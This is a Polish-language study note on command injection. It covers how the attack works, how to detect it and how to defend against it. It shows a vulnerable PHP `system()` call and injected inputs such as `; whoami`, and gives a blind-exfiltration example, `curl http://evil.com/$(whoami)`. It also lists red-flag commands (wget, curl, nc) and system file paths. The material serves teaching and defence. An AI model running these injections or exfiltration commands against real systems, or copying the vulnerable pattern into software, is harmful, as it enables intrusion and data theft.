# command_injection 

## Cel
Poznanie mechaniki działania ataku Command Injection, sposobów jego wykrycia oraz zabezpieczania się przed nim.

## Co to jest 
Jest to atak, w którym atakujący wstrzykuje polecenie systemowe w dane wejściowe aplikacji, które następnie trafiają do wykonania przez system operacyjny serwera. 

## Cel 
- uruchomienie dowolnego polecenia na serwerze, 
- odczytanie plików systemowych (`/etc/passwd`, `/etc/shadow`),
- pobranie i uruchomienie złośliwego skryptu, 
- otwarcie reverse shell, 	
- przejęcie pełnej kontroli nad systemem. 

## Działanie ataku
- aplikacja ma funkcję, która wywołuje polecenie systemowe, np. pinguje hosta podanego przez użytkownika - `system("ping -c 1 " . $_GET['host']);`, 
- gdy użytkownik wpisuje np. `example.com` - aplikacja wykonuje `ping example.com`, 
- atakujący wpisuje `example.com; whoami`, 
- `;` kończy pierwsze polecenie i uruchamia drugie, więc system wykonuje oba, 
- aplikacja zwraca wynik `whoami` (np. www-data) na stronie, 
- atakujący wie, że skoro widzi wynik, to ma możliwość zdalnego wykonywania poleceń, 
- znaki używane przez atakującego:
	- `;` - kończy pierwsze polecenie i zaczyna drugie, 
	- `|` - przekazuje wynik jednego polecenia do drugiego, 
	- `&&` - wykonaj drugie, jeśli pierwsze się uda, 
	- `||` - wykonaj drugie polecenie, jeśli pierwsze się nie uda, 
	- `$(uname -a)` - wykonaj polecenie i wstaw wynik w to miejsce,
	- `` ` `` - wykonaj polecenie w środku (backtick),
- Blind Command Injection - gdy aplikacja nie pokazuje wyniku polecenia, atakujący nadal może je wykonać i wnioskować wynik z zachowania serwera (np. czas odpowiedzi, kod błędu, żądanie do zewnętrznego serwera). Atakujący może także wysłać wynik do swojego serwera - np. `curl http://evil.com/$(whoami)`.  

## Jak wykryć
- payload jest w URL - więc widać go w logach serwera: 
	- `GET /ping?host=google.com;whoami HTTP/1.1` 
- czerwone flagi:
	- `;`, `|`, `&&`, `||`, `$()` w parametrach - oznacza próbę dopisania polecenia, 
	- nazwy poleceń: `whoami`, `id`, `ls`, `cat`, `uname`, `wget`, `curl`, `nc` (netcat - używany do reverse shell) - to polecenia systemowe, które może spróbować wykonać atakujący, 
	- ścieżki `/etc/passwd`, `/bin/bash` - próba odczytu plików systemowych, 
	- zakodowane wersje `%3B` -> `;`, `%7C` -> `|`, `%26` -> `&` - próba obejścia filtrów, 
	- duże opóźnienia w odpowiedziach - możliwy Blind Command Injection, 
- dodatkowe źródła wykrycia: 
	- WAF - loguje payloady, które wyzwoliły reguły, 
	- Logi aplikacji - jeśli loguje wywołanie `system() / exec()`, 
	- monitoring procesów - nietypowe procesy uruchamiane przez użytkownika aplikacji (np. `www-data` uruchamia `whoami`).

## Jak się bronić
- unikanie wywołań systemowych - jeśli to jest możliwe, lepiej użyć biblioteki zamiast `system()`, `exec()`, `shell_exec()`. To pozwala ominąć powłokę systemową, a aplikacja sama robi to, co potrzebuje używając wbudowanej funkcji lub biblioteki. Np. zamiast `ping` przez system -> biblioteka do ICMP w PHP,
- biała lista - pozwolenie tylko na konkretne, bezpieczne wartości, np. znaki alfanumeryczne, tylko konkretne hosty, 
- escapowanie - escapowanie znaków specjalnych przed przekazaniem do systemu (`escapeshellarg()` w PHP),
- zasada minimalnych uprawnień - aplikacja nie powinna działać jako root - to ogranicza skutki ataku, 
- WAF - blokowanie payloadów z `;`, `|`, `&&`, 
- monitoring - ustawienie alertów na polecenia systemowe w logach oraz na nietypowe procesy. 